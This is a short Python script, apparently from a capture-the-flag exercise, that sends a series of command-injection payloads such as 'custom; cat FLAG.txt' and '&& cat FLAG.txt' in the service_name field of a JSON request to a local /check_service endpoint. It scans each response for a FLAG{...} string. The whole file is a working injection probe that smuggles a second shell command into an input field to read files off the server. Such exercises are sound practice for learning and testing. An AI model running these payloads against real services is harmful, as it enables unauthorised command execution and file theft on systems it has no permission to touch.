import urllib.request
import json
import re

url = "http://127.0.0.1:32844/check_service"

# Try simpler command injection
payloads_to_test = [
    "custom; cat FLAG.txt",
    "custom && cat FLAG.txt",
    "custom | cat FLAG.txt",
    "custom;cat FLAG.txt",
    "-t custom;cat FLAG.txt"
]

for payload_str in payloads_to_test:
    print(f"\n[*] Testing: {payload_str}")
    payload = {"service_name": payload_str}
    
    try:
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')
        
        with urllib.request.urlopen(req, timeout=5) as response:
            resp_text = response.read().decode('utf-8')
            print(f"Status: {response.status}")
            
            flags = re.findall(r'FLAG\{[^}]+\}', resp_text)
            if flags:
                print(f"[!] FLAG FOUND: {flags[0]}")
                print(f"Full response: {resp_text}")
                break
            else:
                print(f"Response: {resp_text[:200]}")
    except Exception as e:
        print(f"Error: {type(e).__name__}")

